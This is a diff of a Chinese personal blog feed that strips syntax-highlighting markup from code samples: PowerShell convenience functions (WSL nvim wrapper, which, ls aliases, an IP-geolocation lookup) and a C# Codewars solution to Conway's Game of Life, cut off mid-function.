@@ -84,86 +84,90 @@
 <p>由于主要是为了满足个人使用，所以没怎么做错误处理之类的。</p>
 <h2 id="在-pwsh-中使用-wsl-中的-nvim">在 pwsh 中使用 wsl 中的 nvim</h2>
 <p><code>dos2nix</code> 是将 windows 风格的路径转换为 wsl 中的路径。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">function</span> dos2nix {
-    <span style="color:#66d9ef">param</span>($dosPath)
+<pre><code class="language-powershell">function dos2nix {
+    param($dosPath)
 
-    $path = $dosPath.Replace(<span style="color:#e6db74">&#39;\&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>)
+    $path = $dosPath.Replace('\', '/')
 
-    <span style="color:#66d9ef">if</span> ($path <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#39;[a-zA-Z]:.*&#39;</span>) {
-        $drive = $path.split(<span style="color:#e6db74">&#39;:&#39;</span>)[0].ToLower()
-        $filePath = $path.split(<span style="color:#e6db74">&#39;:&#39;</span>)[1]
+    if ($path -match '[a-zA-Z]:.*') {
+        $drive = $path.split(':')[0].ToLower()
+        $filePath = $path.split(':')[1]
 
-        $nixPath = <span style="color:#e6db74">&#39;/mnt/&#39;</span> + $drive + $filePath
+        $nixPath = '/mnt/' + $drive + $filePath
     }
-    <span style="color:#66d9ef">else</span> {
+    else {
         $nixPath = $path
     }
 
     $nixPath
 }
 
-<span style="color:#66d9ef">function</span> vim {
-    <span style="color:#66d9ef">param</span> (
-        $Path = <span style="color:#e6db74">&#39;.&#39;</span>
+function vim {
+    param (
+        $Path = '.'
     )
 
-    <span style="color:#66d9ef">if</span> ($Path <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
-        $Path = <span style="color:#e6db74">&#39;.&#39;</span>
+    if ($Path -eq '.') {
+        $Path = '.'
     }
-    <span style="color:#66d9ef">else</span> {
+    else {
         $Path = dos2nix -dosPath $Path
     }
 
     wsl -d debian -e nvim $Path
 }
-</code></pre></div><h2 id="which">which</h2>
+</code></pre>
+<h2 id="which">which</h2>
 <p>获取某个可执行文件的路径。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">function</span> which {
-    $results = New-Object System.Collections.Generic.List<span style="color:#66d9ef">[System.Object]</span>;
-    <span style="color:#66d9ef">foreach</span> ($command <span style="color:#66d9ef">in</span> $args) {
+<pre><code class="language-powershell">function which {
+    $results = New-Object System.Collections.Generic.List[System.Object];
+    foreach ($command in $args) {
         $path = (Get-Command $command).Source
-        <span style="color:#66d9ef">if</span> ($path) {
+        if ($path) {
             $results.Add($path);
         }
     }
-    <span style="color:#66d9ef">return</span> $results;
+    return $results;
 }
-</code></pre></div><h2 id="ls">ls</h2>
+</code></pre>
+<h2 id="ls">ls</h2>
 <p>*nix 中的 <code>ls</code> 样式，可惜没搞出来着色。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">function</span> ListDirectory {
+<pre><code class="language-powershell">function ListDirectory {
     Get-ChildItem $args | Format-Wide Name -AutoSize
 }
 
 Set-Alias -Name ls -Value ListDirectory
 Set-Alias -Name ll -Value Get-ChildItem
 Set-Alias -Name l -Value Get-ChildItem
-</code></pre></div><p>related: <a href="https://github.com/JRJurman/PowerLS">powerls</a></p>
+</code></pre>
+<p>related: <a href="https://github.com/JRJurman/PowerLS">powerls</a></p>
 <h2 id="nali">nali</h2>
 <p>接收一个域名或 ip（<code>-Query</code>），返回其 ip 和地理位置信息。</p>
 <p>默认是获取本地的 ip 和位置，语言可以切换英文或中文（默认是中文）。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">function</span> nali {
-    <span style="color:#66d9ef">param</span> (
-        $Query = <span style="color:#e6db74">&#39;&#39;</span>,
-        [<span style="color:#66d9ef">Alias</span>(<span style="color:#e6db74">&#39;l&#39;</span>)]
-        $Lang = <span style="color:#e6db74">&#39;zh&#39;</span>
+<pre><code class="language-powershell">function nali {
+    param (
+        $Query = '',
+        [Alias('l')]
+        $Lang = 'zh'
     )
 
-    <span style="color:#66d9ef">if</span> ($Lang.ToLower() <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#39;en&#39;</span> ) {
-        $Lang = <span style="color:#e6db74">&#39;en&#39;</span>
+    if ($Lang.ToLower() -eq 'en' ) {
+        $Lang = 'en'
     }
-    <span style="color:#66d9ef">else</span> {
-        $Lang = <span style="color:#e6db74">&#39;zh-CN&#39;</span>
+    else {
+        $Lang = 'zh-CN'
     }
 
-    $ApiUrl = <span style="color:#e6db74">&#34;http://ip-api.com/json/{0}?lang={1}&#34;</span> <span style="color:#f92672">-f</span> $Query, $Lang
+    $ApiUrl = &quot;http://ip-api.com/json/{0}?lang={1}&quot; -f $Query, $Lang
 
     $info = (Invoke-WebRequest $ApiUrl).Content | ConvertFrom-Json
 
-    $printInfo = <span style="color:#e6db74">&#34;{0}</span><span style="color:#ae81ff">`t</span><span style="color:#e6db74">[{1} @ {2}, {3}]&#34;</span> <span style="color:#f92672">-f</span> $info.query, $info.isp, $info.city, $info.country
+    $printInfo = &quot;{0}`t[{1} @ {2}, {3}]&quot; -f $info.query, $info.isp, $info.city, $info.country
 
     $printInfo
 }
-</code></pre></div><p>related: <a href="https://github.com/batkiz/nali-go">batkiz/nali-go</a></p>
+</code></pre>
+<p>related: <a href="https://github.com/batkiz/nali-go">batkiz/nali-go</a></p>
 ]]></content></item><item><title>Conway's Game of Life</title><link>https://blog.batkiz.com/posts/2020/conways-game-of-life/</link><pubDate>Fri, 17 Apr 2020 20:55:58 +0800</pubDate><guid>https://blog.batkiz.com/posts/2020/conways-game-of-life/</guid><description>R.I.P John Conway. 由于近期席卷全球的新冠肺炎，John Conway 不幸染病离世。生命游戏 (Game of Life) 是其最为著名的成果。几天前我在 Codewars 上刷到了相关的题目，花了一段时间做了</description><content type="html"><![CDATA[<p>R.I.P John Conway.</p>
 <p>由于近期席卷全球的新冠肺炎，John Conway 不幸染病离世。生命游戏 (Game of Life) 是其最为著名的成果。几天前我在 Codewars 上刷到了相关的题目，花了一段时间做了出来，在此写一篇文章，就当是为了纪念 Conway 吧。</p>
 <h2 id="题目">题目</h2>
@@ -180,418 +184,426 @@ Set-Alias -Name l -Value Get-ChildItem
 <p>在一个无限大的棋盘上，我们以 <code>1</code> 代表存活的生命，以 <code>0</code> 代表死去的生命或 <code>无</code>。</p>
 <p>其上的生命遵循上面的四条规则存活、死去、或是产生下一代。</p>
 <h2 id="思路">思路</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] GetGeneration(<span style="color:#66d9ef">int</span>[,] cells, <span style="color:#66d9ef">int</span> generation)
-</code></pre></div><p>可以看到函数接收了二维数组与一个整数，分别代表了其上的生命与要演化的代数。</p>
+<pre><code class="language-cs">public static int[,] GetGeneration(int[,] cells, int generation)
+</code></pre>
+<p>可以看到函数接收了二维数组与一个整数，分别代表了其上的生命与要演化的代数。</p>
 <p>首先我们要认识清楚，棋盘的大小是<strong>无限的</strong>，而不仅仅是接收的二维数组的大小。当然，题中也给出了计算邻居的规则，我们在处理时，要将接收到的数组扩大一圈。</p>
 <p>新建一个长宽各自 +2 的矩形，再把目前的矩形放在其正中间，最后返回这个矩形。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] NewBoard(<span style="color:#66d9ef">int</span>[,] cells)
+<pre><code class="language-cs">public static int[,] NewBoard(int[,] cells)
 {
-    <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
-    <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
+    var hang = cells.GetLength(0);
+    var lie = cells.GetLength(1);
 
-    <span style="color:#66d9ef">var</span> newBoard = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hang + <span style="color:#ae81ff">2</span>, lie + <span style="color:#ae81ff">2</span>];
+    var newBoard = new int[hang + 2, lie + 2];
 
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hang + <span style="color:#ae81ff">2</span>; i++)
+    for (int i = 0; i &lt; hang + 2; i++)
     {
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lie + <span style="color:#ae81ff">2</span>; j++)
+        for (int j = 0; j &lt; lie + 2; j++)
         {
-            newBoard[i, j] = <span style="color:#ae81ff">0</span>;
+            newBoard[i, j] = 0;
         }
     }
 
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">1</span>; i &lt; hang + <span style="color:#ae81ff">1</span>; i++)
+    for (int i = 1; i &lt; hang + 1; i++)
     {
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">1</span>; j &lt; lie + <span style="color:#ae81ff">1</span>; j++)
+        for (int j = 1; j &lt; lie + 1; j++)
         {
-            newBoard[i, j] = cells[i - <span style="color:#ae81ff">1</span>, j - <span style="color:#ae81ff">1</span>];
+            newBoard[i, j] = cells[i - 1, j - 1];
         }
     }
 
-    <span style="color:#66d9ef">return</span> newBoard;
+    return newBoard;
 }
-</code></pre></div><p>相应的，在返回最终的结果时，棋盘除了有生命存在的一个矩形之外，也要裁剪掉多出的全为 0 的行与列。</p>
+</code></pre>
+<p>相应的，在返回最终的结果时，棋盘除了有生命存在的一个矩形之外，也要裁剪掉多出的全为 0 的行与列。</p>
 <p>这里是分别从上下、左右遍历了数组，获取了其存在 1 的最外层的坐标，然后把它裁剪了下来，返回了最精简的数组。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] cropped(<span style="color:#66d9ef">int</span>[,] cells)
+<pre><code class="language-cs">public static int[,] cropped(int[,] cells)
 {
-    <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
-    <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
-    <span style="color:#66d9ef">var</span> (hStart, lStart, hEnd, lEnd, hLen, lLen) = (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+    var hang = cells.GetLength(0);
+    var lie = cells.GetLength(1);
+    var (hStart, lStart, hEnd, lEnd, hLen, lLen) = (0, 0, 0, 0, 0, 0);
 
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hang; i++)
+    for (int i = 0; i &lt; hang; i++)
     {
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lie; j++)
+        for (int j = 0; j &lt; lie; j++)
         {
-            <span style="color:#66d9ef">if</span> (cells[i, j] != <span style="color:#ae81ff">0</span>)
+            if (cells[i, j] != 0)
             {
                 hStart = i;
                 i = hang;
-                <span style="color:#66d9ef">break</span>;
+                break;
             }
         }
     }
 
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = hang - <span style="color:#ae81ff">1</span>; i &gt;= <span style="color:#ae81ff">0</span>; i--)
+    for (int i = hang - 1; i &gt;= 0; i--)
     {
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = lie - <span style="color:#ae81ff">1</span>; j &gt;= <span style="color:#ae81ff">0</span>; j--)
+        for (int j = lie - 1; j &gt;= 0; j--)
         {
-            <span style="color:#66d9ef">if</span> (cells[i, j] != <span style="color:#ae81ff">0</span>)
+            if (cells[i, j] != 0)
             {
                 hEnd = i;
-                i = <span style="color:#ae81ff">0</span>;
-                <span style="color:#66d9ef">break</span>;
+                i = 0;
+                break;
             }
         }
     }
 
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; lie; i++)
+    for (int i = 0; i &lt; lie; i++)
     {
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; hang; j++)
+        for (int j = 0; j &lt; hang; j++)
         {
-            <span style="color:#66d9ef">if</span> (cells[j, i] != <span style="color:#ae81ff">0</span>)
+            if (cells[j, i] != 0)
             {
                 lStart = i;
                 i = lie;
-                <span style="color:#66d9ef">break</span>;
+                break;
             }
         }
     }
 
 
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = lie - <span style="color:#ae81ff">1</span>; i &gt;= <span style="color:#ae81ff">0</span>; i--)
+    for (int i = lie - 1; i &gt;= 0; i--)
     {
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = hang - <span style="color:#ae81ff">1</span>; j &gt;= <span style="color:#ae81ff">0</span>; j--)
+        for (int j = hang - 1; j &gt;= 0; j--)
         {
-            <span style="color:#66d9ef">if</span> (cells[j, i] != <span style="color:#ae81ff">0</span>)
+            if (cells[j, i] != 0)
             {
                 lEnd = i;
-                i = <span style="color:#ae81ff">0</span>;
-                <span style="color:#66d9ef">break</span>;
+                i = 0;
+                break;
             }
         }
     }
 
-    hLen = hEnd - hStart + <span style="color:#ae81ff">1</span>;
-    lLen = lEnd - lStart + <span style="color:#ae81ff">1</span>;
+    hLen = hEnd - hStart + 1;
+    lLen = lEnd - lStart + 1;
 
-    <span style="color:#66d9ef">var</span> newCell = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hLen, lLen];
+    var newCell = new int[hLen, lLen];
 
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hLen; i++)
+    for (int i = 0; i &lt; hLen; i++)
     {
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lLen; j++)
+        for (int j = 0; j &lt; lLen; j++)
         {
             newCell[i, j] = cells[hStart + i, lStart + j];
         }
     }
 
-    <span style="color:#66d9ef">return</span> newCell;
+    return newCell;
 }
-</code></pre></div><p>确定了最先与最后的步骤，就要处理中间的过程了。</p>
+</code></pre>
+<p>确定了最先与最后的步骤，就要处理中间的过程了。</p>
 <p>为了确定某一个坐标下的生物在下一轮中是死是活，只需要获取它有多少存活的邻居，再用给出的四条规则来判定就能得出了。</p>
 <p>首先是获取某一特定坐标的生物有多少活着的邻居，仅需遍历它八个邻居的位置并确定是否存活即可。值得注意的是，对于最外层、邻居不足八个的生物要做特殊的处理，以防数组越界。由于我懒得确定是否越界，就用了一个邪道玩法，如果出现了数组越界的 Exception 就忽略掉它继续访问下一个地址。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> GetLiveNeighbors(<span style="color:#66d9ef">int</span> x, <span style="color:#66d9ef">int</span> y, <span style="color:#66d9ef">int</span>[,] ceil)
+<pre><code class="language-cs">public static int GetLiveNeighbors(int x, int y, int[,] ceil)
 {
-    <span style="color:#66d9ef">var</span> val = <span style="color:#ae81ff">0</span>;
-    <span style="color:#66d9ef">int</span>[] neighbors = { <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, -<span style="color:#ae81ff">1</span> };
+    var val = 0;
+    int[] neighbors = { 0, 1, -1 };
 
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; <span style="color:#ae81ff">3</span>; i++)
+    for (int i = 0; i &lt; 3; i++)
     {
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; <span style="color:#ae81ff">3</span>; j++)
+        for (int j = 0; j &lt; 3; j++)
         {
-            <span style="color:#66d9ef">if</span> (!(neighbors[i] == <span style="color:#ae81ff">0</span> &amp;&amp; neighbors[j] == <span style="color:#ae81ff">0</span>))
+            if (!(neighbors[i] == 0 &amp;&amp; neighbors[j] == 0))
             {
-                <span style="color:#66d9ef">int</span> r = (x + neighbors[i]);
-                <span style="color:#66d9ef">int</span> c = (y + neighbors[j]);
+                int r = (x + neighbors[i]);
+                int c = (y + neighbors[j]);
 
-                <span style="color:#66d9ef">try</span>
+                try
                 {
-                    <span style="color:#66d9ef">if</span> (ceil[r, c] == <span style="color:#ae81ff">1</span>)
+                    if (ceil[r, c] == 1)
                     {
-                        val += <span style="color:#ae81ff">1</span>;
+                        val += 1;
                     }
                 }
-                <span style="color:#66d9ef">catch</span> (System.Exception)
+                catch (System.Exception)
                 {
-                    val += <span style="color:#ae81ff">0</span>;
-                    <span style="color:#66d9ef">continue</span>;
+                    val += 0;
+                    continue;
                 }
             }
         }
     }
 
-    <span style="color:#66d9ef">return</span> val;
+    return val;
 }
-</code></pre></div><p>下面则是确定某一坐标下的生物在下一轮中是死是活。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
-<span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
-<span style="color:#66d9ef">var</span> newGen = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hang + <span style="color:#ae81ff">2</span>, lie + <span style="color:#ae81ff">2</span>];
-<span style="color:#66d9ef">var</span> biggerCells = NewBoard(cells);
+</code></pre>
+<p>下面则是确定某一坐标下的生物在下一轮中是死是活。</p>
+<pre><code class="language-cs">var hang = cells.GetLength(0);
+var lie = cells.GetLength(1);
+var newGen = new int[hang + 2, lie + 2];
+var biggerCells = NewBoard(cells);
 
-<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> x = <span style="color:#ae81ff">0</span>; x &lt; hang + <span style="color:#ae81ff">2</span>; x++)
+for (int x = 0; x &lt; hang + 2; x++)
 {
-    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> y = <span style="color:#ae81ff">0</span>; y &lt; lie + <span style="color:#ae81ff">2</span>; y++)
+    for (int y = 0; y &lt; lie + 2; y++)
     {
-        <span style="color:#66d9ef">var</span> n = GetLiveNeighbors(x, y, biggerCells);
-        <span style="color:#66d9ef">var</span> c = biggerCells[x, y];
+        var n = GetLiveNeighbors(x, y, biggerCells);
+        var c = biggerCells[x, y];
 
-        newGen[x, y] = ((c == <span style="color:#ae81ff">1</span>) &amp;&amp; (n == <span style="color:#ae81ff">2</span> || n == <span style="color:#ae81ff">3</span>) || (c == <span style="color:#ae81ff">0</span>) &amp;&amp; n == <span style="color:#ae81ff">3</span>) ? <span style="color:#ae81ff">1</span> : <span style="color:#ae81ff">0</span>;
+        newGen[x, y] = ((c == 1) &amp;&amp; (n == 2 || n == 3) || (c == 0) &amp;&amp; n == 3) ? 1 : 0;
     }
 }
 
-<span style="color:#66d9ef">var</span> result = cropped(newGen);
-</code></pre></div><p>至于代数，一个递归就能解决问题了。在此不作赘述。</p>
+var result = cropped(newGen);
+</code></pre>
+<p>至于代数，一个递归就能解决问题了。在此不作赘述。</p>
 <h2 id="完整代码">完整代码</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cs" data-lang="cs"><span style="color:#66d9ef">using</span> System;
-<span style="color:#66d9ef">using</span> System.Linq;
+<pre><code class="language-cs">using System;
+using System.Linq;
 
-<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ConwayLife</span>
+public class ConwayLife
 {
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] GetGeneration(<span style="color:#66d9ef">int</span>[,] cells, <span style="color:#66d9ef">int</span> generation)
+    public static int[,] GetGeneration(int[,] cells, int generation)
     {
-        <span style="color:#66d9ef">if</span> (generation &lt;= <span style="color:#ae81ff">0</span>)
+        if (generation &lt;= 0)
         {
-            <span style="color:#66d9ef">return</span> cells;
+            return cells;
         }
 
-        <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
-        <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
+        var hang = cells.GetLength(0);
+        var lie = cells.GetLength(1);
 
-        <span style="color:#66d9ef">var</span> newGen = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hang + <span style="color:#ae81ff">2</span>, lie + <span style="color:#ae81ff">2</span>];
+        var newGen = new int[hang + 2, lie + 2];
 
-        <span style="color:#66d9ef">var</span> biggerCells = NewBoard(cells);
+        var biggerCells = NewBoard(cells);
 
 
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> x = <span style="color:#ae81ff">0</span>; x &lt; hang + <span style="color:#ae81ff">2</span>; x++)
+        for (int x = 0; x &lt; hang + 2; x++)
         {
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> y = <span style="color:#ae81ff">0</span>; y &lt; lie + <span style="color:#ae81ff">2</span>; y++)
+            for (int y = 0; y &lt; lie + 2; y++)
             {
-                <span style="color:#66d9ef">var</span> n = GetLiveNeighbors(x, y, biggerCells);
-                <span style="color:#66d9ef">var</span> c = biggerCells[x, y];
+                var n = GetLiveNeighbors(x, y, biggerCells);
+                var c = biggerCells[x, y];
 
-                newGen[x, y] = ((c == <span style="color:#ae81ff">1</span>) &amp;&amp; (n == <span style="color:#ae81ff">2</span> || n == <span style="color:#ae81ff">3</span>) || (c == <span style="color:#ae81ff">0</span>) &amp;&amp; n == <span style="color:#ae81ff">3</span>) ? <span style="color:#ae81ff">1</span> : <span style="color:#ae81ff">0</span>;
+                newGen[x, y] = ((c == 1) &amp;&amp; (n == 2 || n == 3) || (c == 0) &amp;&amp; n == 3) ? 1 : 0;
             }
         }
 
-        <span style="color:#66d9ef">var</span> result = cropped(newGen);
+        var result = cropped(newGen);
 
-        <span style="color:#66d9ef">return</span> GetGeneration(result, generation - <span style="color:#ae81ff">1</span>);
+        return GetGeneration(result, generation - 1);
     }
 
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> GetLiveNeighbors(<span style="color:#66d9ef">int</span> x, <span style="color:#66d9ef">int</span> y, <span style="color:#66d9ef">int</span>[,] ceil)
+    public static int GetLiveNeighbors(int x, int y, int[,] ceil)
     {
-        <span style="color:#66d9ef">var</span> val = <span style="color:#ae81ff">0</span>;
-        <span style="color:#66d9ef">int</span>[] neighbors = { <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, -<span style="color:#ae81ff">1</span> };
+        var val = 0;
+        int[] neighbors = { 0, 1, -1 };
 
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; <span style="color:#ae81ff">3</span>; i++)
+        for (int i = 0; i &lt; 3; i++)
         {
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; <span style="color:#ae81ff">3</span>; j++)
+            for (int j = 0; j &lt; 3; j++)
             {
-                <span style="color:#66d9ef">if</span> (!(neighbors[i] == <span style="color:#ae81ff">0</span> &amp;&amp; neighbors[j] == <span style="color:#ae81ff">0</span>))
+                if (!(neighbors[i] == 0 &amp;&amp; neighbors[j] == 0))
                 {
-                    <span style="color:#66d9ef">int</span> r = (x + neighbors[i]);
-                    <span style="color:#66d9ef">int</span> c = (y + neighbors[j]);
+                    int r = (x + neighbors[i]);
+                    int c = (y + neighbors[j]);
 
-                    <span style="color:#66d9ef">try</span>
+                    try
                     {
-                        <span style="color:#66d9ef">if</span> (ceil[r, c] == <span style="color:#ae81ff">1</span>)
+                        if (ceil[r, c] == 1)
                         {
-                            val += <span style="color:#ae81ff">1</span>;
+                            val += 1;
                         }
                     }
-                    <span style="color:#66d9ef">catch</span> (System.Exception)
+                    catch (System.Exception)
                     {
-                        val += <span style="color:#ae81ff">0</span>;
-                        <span style="color:#66d9ef">continue</span>;
+                        val += 0;
+                        continue;
                     }
                 }
             }
         }
 
-        <span style="color:#66d9ef">return</span> val;
+        return val;
     }
 
-    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span>[,] cropped(<span style="color:#66d9ef">int</span>[,] cells)
+    public static int[,] cropped(int[,] cells)
     {
-        <span style="color:#66d9ef">var</span> hang = cells.GetLength(<span style="color:#ae81ff">0</span>);
-        <span style="color:#66d9ef">var</span> lie = cells.GetLength(<span style="color:#ae81ff">1</span>);
-        <span style="color:#66d9ef">var</span> (hStart, lStart, hEnd, lEnd, hLen, lLen) = (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+        var hang = cells.GetLength(0);
+        var lie = cells.GetLength(1);
+        var (hStart, lStart, hEnd, lEnd, hLen, lLen) = (0, 0, 0, 0, 0, 0);
 
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; hang; i++)
+        for (int i = 0; i &lt; hang; i++)
         {
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; lie; j++)
+            for (int j = 0; j &lt; lie; j++)
             {
-                <span style="color:#66d9ef">if</span> (cells[i, j] != <span style="color:#ae81ff">0</span>)
+                if (cells[i, j] != 0)
                 {
                     hStart = i;
                     i = hang;
-                    <span style="color:#66d9ef">break</span>;
+                    break;
                 }
             }
         }
 
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = hang - <span style="color:#ae81ff">1</span>; i &gt;= <span style="color:#ae81ff">0</span>; i--)
+        for (int i = hang - 1; i &gt;= 0; i--)
         {
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = lie - <span style="color:#ae81ff">1</span>; j &gt;= <span style="color:#ae81ff">0</span>; j--)
+            for (int j = lie - 1; j &gt;= 0; j--)
             {
-                <span style="color:#66d9ef">if</span> (cells[i, j] != <span style="color:#ae81ff">0</span>)
+                if (cells[i, j] != 0)
                 {
                     hEnd = i;
-                    i = <span style="color:#ae81ff">0</span>;
-                    <span style="color:#66d9ef">break</span>;
+                    i = 0;
+                    break;
                 }
             }
         }
 
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; lie; i++)
+        for (int i = 0; i &lt; lie; i++)
         {
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = <span style="color:#ae81ff">0</span>; j &lt; hang; j++)
+            for (int j = 0; j &lt; hang; j++)
             {
-                <span style="color:#66d9ef">if</span> (cells[j, i] != <span style="color:#ae81ff">0</span>)
+                if (cells[j, i] != 0)
                 {
                     lStart = i;
                     i = lie;
-                    <span style="color:#66d9ef">break</span>;
+                    break;
                 }
             }
         }
 
 
-        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = lie - <span style="color:#ae81ff">1</span>; i &gt;= <span style="color:#ae81ff">0</span>; i--)
+        for (int i = lie - 1; i &gt;= 0; i--)
         {
-            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j = hang - <span style="color:#ae81ff">1</span>; j &gt;= <span style="color:#ae81ff">0</span>; j--)
+            for (int j = hang - 1; j &gt;= 0; j--)
             {
-                <span style="color:#66d9ef">if</span> (cells[j, i] != <span style="color:#ae81ff">0</span>)
+                if (cells[j, i] != 0)
                 {
                     lEnd = i;
-                    i = <span style="color:#ae81ff">0</span>;
-                    <span style="color:#66d9ef">break</span>;
+                    i = 0;
+                    break;
                 }
             }
         }
 
-        hLen = hEnd - hStart + <span style="color:#ae81ff">1</span>;
-        lLen = lEnd - lStart + <span style="color:#ae81ff">1</span>;
+        hLen = hEnd - hStart + 1;
+        lLen = lEnd - lStart + 1;
 
-        <span style="color:#66d9ef">var</span> newCell = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">int</span>[hLen, lLen];
+        var newCell = new int[hLen, lLen];
 
-        Console.WriteLine(<span style="color:#e6db74">$&#34;h {hLen} l {lLen}&#34;</span>);
+        Console.WriteLine($&quot;h {hLen} l {lLen}&quot;);
 
